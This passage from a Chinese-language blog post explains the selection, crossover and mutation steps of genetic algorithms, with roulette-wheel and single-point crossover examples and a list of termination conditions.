<p><img src="/2018/09/23/关于遗传算法/2.3.jpg" alt=""></p>
<p>一次类推，当染色体包含更多生存分数时，也就意味着它的适应性更强。因此，由图可知，染色体 1 适应性强于染色体 2。</p>
<p>2.3选择</p>
<p>现在接下来我们依照步骤二从总体中选择适合的染色体进行交叉操作，并且产生自己的下一代，但是这样将会导致染色体在几代之后相互差异减小，失去了多样性。故而，这部分会有多种选择算法，常见的选择操作主要有以下几种 : </p>
<p>​       a)轮盘赌选择 。选择某假设的概率是通过这个假设的适应度与当前群体中其他成员的适应度的比值而得到。此方法是基于概率选择的,存在统计误差,因此可以结合最优保存策略以保证当前适应度最优的个体能够进化到下一代而不被遗传操作的随机性破坏,保证算法的收敛性。       </p>
<p>​       b)排序选择。对个体适应值取正值或负值以及个体适应度之间的数值差异程度无特殊要求 , 对群体中的所有个体按其适应度大小进行排序,根据排序来分配各个体被选中的概率。        </p>
<p>​       c)最优个体保存。父代群体中的最优个体直接进入子代群体中。该方法可保证在遗传过程中所得到的个体不会被交叉和变异操作所破坏,它是遗传算法收敛性的一个重要保证条件 ；它也容易使得局部最优个体不易被淘汰,从而使算法的全局搜索能力变强。        </p>
<p>​       d)随机联赛选择。每次选取N个个体中适应度最高的个体遗传到下一代 群体中。具体操作如下: 从群体中随机选取N个个体进行适应度大小比较,将其中适应度最高的个体遗传到下一代群体中；将上述过程重复执行M(为群体大小)次,则可得到下一代群体。 </p>
<p>而我们一般会进行轮盘赌选择法， 想象有一个轮盘，现在我们将它分割成 m 个部分，这里的 m 代表我们总体中染色体的个数。每条染色体在轮盘上占有的区域面积将根据适应度分数成比例表达出来。</p>
<p>如图：Chromosome1的百分比：28/（28+23+12+34）=28.9% </p>
<p><img src="/2018/09/23/关于遗传算法/2.4.jpg" alt=""></p>
<p>我们基于上面的百分比来建立轮盘，如下图所示：</p>
<p><img src="/2018/09/23/关于遗传算法/2.5.jpg" alt=""></p>
<p>现在，这个轮盘开始旋转，我们将被图中固定的指针（fixed point）指到的那片区域选为第一个亲本。然后，对于第二个亲本，我们进行同样的操作。有时候我们也会在途中标注两个固定指针，如下图： </p>
<p><img src="/2018/09/23/关于遗传算法/2.6.jpg" alt=""></p>
<p>通过这种方法，我们可以在一轮中就获得两个亲本。我们将这种方法成为「随机普遍选择法」（Stochastic Universal Selection method）。 </p>
<p>2.4交叉</p>
<p>在上一个步骤中，我们已经选择出了可以产生后代的亲本染色体。现在我们来对染色体 1 和 4（在上一个步骤中选出来的）进行交叉操作 ，而此处的常用交叉算法有如下几种：</p>
<p>  a)单点交叉。  在个体编码串中随机设置一个交叉点后在该点相互交换两个配对个体的部分基因 。        </p>
<p>  b)两点交叉。  在相互配对的两个个体编码串中随机设置两个交叉点,并交换两个交叉点之间的部分基因 。        </p>
<p>  c)均匀交叉。  两个相互配对个体的每一位基因都以相同的概率进行交换,从而形成两个新个体。       </p>
<p>  d)算术交叉。  由两个个体的线性组合而产生出新的个体。 </p>
<p>此处我们来演示单点交叉于多点交叉：</p>
<p><img src="/2018/09/23/关于遗传算法/3.1.jpg" alt=""></p>
<p>这是交叉最基本的形式，我们称其为「单点交叉」。这里我们随机选择一个交叉点，然后，将交叉点前后的染色体部分进行染色体间的交叉对调，于是就产生了新的后代。 </p>
<p>如果你设置两个交叉点，那么这种方法被成为「多点交叉」，见下图： </p>
<p><img src="/2018/09/23/关于遗传算法/3.2.jpg" alt=""></p>
<p>2.5变异</p>
<p>如果现在我们从生物学的角度来看这个问题，那么请问：由上述过程产生的后代是否有和其父母一样的性状呢？答案是否。在后代的生长过程中，它们体内的基因会发生一些变化，使得它们与父母不同。这个过程我们称为变异，它可以被定义为染色体上发生的随机变化，正是因为变异，种群中才会存在多样性。 </p>
<p>下图为变异的一个简单示例： </p>
<p><img src="/2018/09/23/关于遗传算法/3.3.jpg" alt=""></p>
<p>变异完成之后，我们就得到了新为个体，进化也就完成了，整个过程如下图：</p>
<p><img src="/2018/09/23/关于遗传算法/3.4.jpg" alt=""></p>
<p>​在进行完一轮遗传变异之后，我们用适应度函数对这些新的后代进行验证，如果函数判定它们适应度足够，那么就会用它们从总体中替代掉那些适应度不够的染色体。这里有个问题，我们最终应该以什么标准来判断后代达到了最佳适应度水平呢？</p>
<p>一般来说，有如下几个终止条件：</p>
<ol>
<li>进化次数限制；</li>
<li>计算耗费的资源限制（例如计算时间、计算占用的内存等）；</li>
<li>一个个体已经满足最优值的条件，即最优值已经找到；</li>
<li>适应度已经达到饱和，继续进化不会产生适应度更好的个体；</li>
<li>人为干预；</li>
<li>以及以上两种或更多种的组合。</li>
</ol>
<p><strong>参考文献</strong></p>
<p>【1】<a href="https://zhuanlan.zhihu.com/p/28328304" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/28328304</a>【例子】</p>
<p>【2】<a href="https://zh.wikipedia.org/wiki/%E9%81%97%E4%BC%A0%E7%AE%97%E6%B3%95" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/%E9%81%97%E4%BC%A0%E7%AE%97%E6%B3%95</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/算法/">算法</a>
    </span>
    

    </div>

    
  </div>
</article>




<nav class="pagination">
  
  
  <a href="/page/2/" class="pagination-next">Next</a>
  
</nav>
    </main>

    <footer class="site-footer">
  <p class="site-info">
    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
    </br>
    
    &copy; 2019 fanson
    
  </p>
</footer>
    
  </div>
</div>
<script type="text/javascript" src="/js/src/love.js"></script>
</body>
</html>